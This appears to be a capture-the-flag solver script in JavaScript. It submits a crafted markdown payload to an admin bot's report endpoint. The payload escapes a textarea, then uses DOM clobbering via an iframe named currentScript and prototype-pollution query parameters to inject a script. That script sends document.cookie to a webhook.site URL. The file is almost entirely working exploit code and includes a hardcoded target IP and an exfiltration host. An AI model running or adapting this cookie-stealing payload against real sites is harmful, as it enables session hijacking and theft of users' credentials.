import fastify from "fastify";
import assert from "node:assert/strict";

const BOT_BASE_URL = process.env.BOT_BASE_URL ?? "http://34.170.146.252:42071";
const CONNECTBACK_URL = "https://webhook.site/50238b92-8784-4b1b-be29-187eab4769d4"
const PORT = "8080";

const app = fastify();

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const reportUrl = (url) =>
    fetch(`${BOT_BASE_URL}/api/report`, {
        method: "POST",
        headers: {
            "Content-Type": "application/json",
        },
        body: JSON.stringify({ url }),
    }).then((r) => r.text());

app.get("/*", async (req, reply) => {
    // You got a flag!
    console.log(decodeURIComponent(req.url));
    process.exit(0);
});

const markdown = `
</textarea>
<iframe name=currentScript src="/?__proto__[tagName]=SCRIPT&__proto__[src]=data:,location='${CONNECTBACK_URL}/'%2bdocument.cookie//" credentialless></iframe>
<link rel=stylesheet href=/0>
<link rel=stylesheet href=/1>
<link rel=stylesheet href=/2>
<link rel=stylesheet href=/3>
<link rel=stylesheet href=/4>
<link rel=stylesheet href=/5>
<link rel=stylesheet href=/6>
<textarea>
`.trim();

app.listen({ port: PORT, host: "0.0.0.0" }, async (err) => {
    if (err) assert.fail(err.toString());

    await sleep(3_000);
    await reportUrl(
        `http://34.170.146.252:61728${new URLSearchParams({ markdown })}`
    );

    await sleep(3_000);
    assert.fail("Failed");
});